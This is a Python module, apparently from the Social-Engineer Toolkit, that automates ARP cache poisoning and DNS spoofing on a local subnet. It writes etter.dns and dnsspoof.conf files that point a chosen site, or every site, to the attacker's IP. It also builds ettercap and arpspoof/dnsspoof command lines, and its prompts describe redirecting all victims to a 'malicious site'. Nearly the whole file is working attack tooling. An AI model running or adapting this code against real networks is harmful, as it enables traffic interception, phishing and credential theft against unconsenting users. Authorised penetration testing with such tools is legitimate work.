import subprocess
import re
import pexpect
import os
import time
import sys
from src.core.setcore import *
definepath = os.getcwd()
config = open("/etc/setoolkit/set.config", "r").readlines()
cwd = os.getcwd()
ettercapchoice = 'n'
dsniffchoice = 'n'
for line in config:
    match1 = re.search("ETTERCAP=ON", line)
    if match1:
        print_info("ARP Cache Poisoning is set to " +
                   bcolors.GREEN + "ON" + bcolors.ENDC)
        ettercapchoice = 'y'
    match2 = re.search("DSNIFF=ON", line)
    if match2:
        print_info("DSNIFF DNS Poisoning is set to " +
                   bcolors.GREEN + "ON" + bcolors.ENDC)
        dsniffchoice = 'y'
        ettercapchoice = 'n'
fileopen = open("/etc/setoolkit/set.config", "r").readlines()
for line in fileopen:
    match = re.search("ETTERCAP_INTERFACE=", line)
    if match:
        line = line.rstrip()
        interface = line.split("=")
        interface = interface[1]
        if interface == "NONE":
            interface = ""
    etterpath = re.search("ETTERCAP_PATH=", line)
    if etterpath:
        line = line.rstrip()
        path = line.replace("ETTERCAP_PATH=", "")
        if not os.path.isfile(path):
            path = ("/usr/local/share/ettercap")
if ettercapchoice == 'y':
    if check_options("IPADDR=") != 0:
        ipaddr = check_options("IPADDR=")
    else:
        ipaddr = raw_input(setprompt("0", "IP address to connect back on: "))
        update_options("IPADDR=" + ipaddr)
    if ettercapchoice == 'y':
        try:
            print("""
  This attack will poison all victims on your local subnet, and redirect them
  when they hit a specific website. The next prompt will ask you which site you
  will want to trigger the DNS redirect on. A simple example of this is if you
  wanted to trigger everyone on your subnet to connect to you when they go to
  browse to www.google.com, the victim would then be redirected to your malicious
  site. You can alternatively poison everyone and everysite by using the wildcard
  '*' flag.
  IF YOU WANT TO POISON ALL DNS ENTRIES (DEFAULT) JUST HIT ENTER OR *
""")
            print_info("Example: http://www.google.com")
            dns_spoof = raw_input(
                setprompt("0", "Site to redirect to attack machine [*]"))
            os.chdir(path)
            if dns_spoof == "":
                dns_spoof = "*"
            subprocess.Popen(
                "rm etter.dns 1> /dev/null 2> /dev/null", shell=True).wait()
            filewrite = open("etter.dns", "w")
            filewrite.write("%s A %s" % (dns_spoof, ipaddr))
            filewrite.close()
            bridge = ""
            arp = "-M arp"
            print_error("LAUNCHING ETTERCAP DNS_SPOOF ATTACK!")
            os.chdir(cwd)
            time.sleep(5)
            filewrite = open(userconfigpath + "ettercap", "w")
            filewrite.write(
                "ettercap -T -q -i %s -P dns_spoof %s %s // //" % (interface, arp, bridge))
            filewrite.close()
            os.chdir(cwd)
        except Exception as error:
            os.chdir(cwd)
            print_error("ERROR:An error has occured:")
            print("ERROR:" + str(error))
if dsniffchoice == 'y':
    if check_options("IPADDR=") != 0:
        ipaddr = check_options("IPADDR=")
    else:
        ipaddr = raw_input(setprompt("0", "IP address to connect back on: "))
        update_options("IPADDR=" + ipaddr)
    if dsniffchoice == 'y':
        try:
            print("""
  This attack will poison all victims on your local subnet, and redirect them
  when they hit a specific website. The next prompt will ask you which site you
  will want to trigger the DNS redirect on. A simple example of this is if you
  wanted to trigger everyone on your subnet to connect to you when they go to
  browse to www.google.com, the victim would then be redirected to your malicious
  site. You can alternatively poison everyone and everysite by using the wildcard
  '*' flag.
  IF YOU WANT TO POISON ALL DNS ENTRIES (DEFAULT) JUST HIT ENTER OR *
""")
            print_info("Example: http://www.google.com")
            dns_spoof = raw_input(
                setprompt("0", "Site to redirect to attack machine [*]"))
            if dns_spoof == "":
                dns_spoof = "*"
            subprocess.Popen(
                "rm %s/dnsspoof.conf 1> /dev/null 2> /dev/null" % (userconfigpath), shell=True).wait()
            filewrite = open(userconfigpath + "dnsspoof.conf", "w")
            filewrite.write("%s %s" % (ipaddr, dns_spoof))
            filewrite.close()
            print_error("LAUNCHING DNSSPOOF DNS_SPOOF ATTACK!")
            os.chdir(cwd)
            gateway = subprocess.Popen("netstat -rn|grep %s|awk '{print $2}'| awk 'NR==2'" % (
                interface), shell=True, stdout=subprocess.PIPE).communicate()[0]
            filewrite = open(userconfigpath + "ettercap", "w")
            filewrite.write(
                "arpspoof %s | dnsspoof -f %s/dnsspoof.conf" % (gateway, userconfigpath))
            filewrite.close()
            os.chdir(cwd)
            pause = raw_input("Press <return> to begin dsniff.")
        except Exception as error:
            os.chdir(cwd)
            print_error("ERROR:An error has occurred:")
            print(bcolors.RED + "ERROR" + str(error) + bcolors.ENDC)